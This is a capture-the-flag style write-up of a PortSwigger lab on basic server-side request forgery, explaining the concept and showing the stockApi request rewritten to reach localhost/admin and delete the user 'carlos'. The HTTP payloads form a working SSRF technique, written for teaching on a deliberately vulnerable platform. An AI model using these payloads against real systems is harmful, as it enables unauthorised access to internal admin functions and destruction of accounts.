# Basic SSRF Against the Local Server

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

---

## Lab

https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

---

## OWASP Category

A10:2021 – Server-Side Request Forgery (SSRF)

---

## Core Concept

**SSRF (Server-Side Request Forgery)** happens when an application fetches a URL that the user controls. Instead of pointing the URL to a legitimate resource, we point it to internal services that are not accessible from the outside.

```
Normal flow:
Browser → App Server → External API (stock.weliketoshop.net)

SSRF attack:
Browser → App Server → Internal admin (localhost/admin)
                              ↑
               Server makes this request — we can't
               access localhost directly but the
               SERVER can reach its own localhost
```

**Why does localhost bypass access controls?**
- App trusts requests from `127.0.0.1` as if they come from an admin
- Access control check only runs for external requests
- The admin panel may listen on internal ports not exposed to internet

---

## Steps to Solve

---

**Step 1 — Find the SSRF Injection Point**

Navigate to any product page and click **Check stock**. Intercept in ZAP:

```http
POST /product/stock HTTP/1.1
Host: lab-id.web-security-academy.net

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D1%26storeId%3D1
```

The `stockApi` parameter contains a **full URL** — this is the SSRF injection point.

<img width="1195" height="408" alt="image" src="https://github.com/user-attachments/assets/23082c9a-d86e-42f1-9791-79ebc6b8dfa0" />

---

**Step 2 — Access localhost Admin**

Change `stockApi` to point to the local admin interface:

```http
stockApi=http://localhost/admin
```

The server fetches its own admin page and returns the HTML to us.

<img width="920" height="575" alt="image" src="https://github.com/user-attachments/assets/4957bffd-8304-4c4d-be59-b1a73f2ff45d" />

---

**Step 3 — Find the Delete User URL**

In the response HTML, find the link to delete carlos:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

<img width="704" height="198" alt="image" src="https://github.com/user-attachments/assets/651482b4-0edd-4353-ada2-2d21b4e8796d" />

---

**Step 4 — Delete Carlos**

Change `stockApi` to the delete URL:

```http
stockApi=http://localhost/admin/delete?username=carlos
```

Carlos is deleted.

<img width="643" height="214" alt="image" src="https://github.com/user-attachments/assets/ece4fe95-701b-456a-a8d4-bc59cbf22a70" />

---

**Lab Solved**

<img width="1523" height="581" alt="image" src="https://github.com/user-attachments/assets/259c9cb6-2b2e-4f22-ae5a-3a39ae17dce9" />

---

## Why This Works

```
We send:    POST stockApi=http://localhost/admin
App thinks: The request to /admin is from 127.0.0.1
App says:   127.0.0.1 is trusted → grant admin access
We get:     Full admin panel content 
```

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
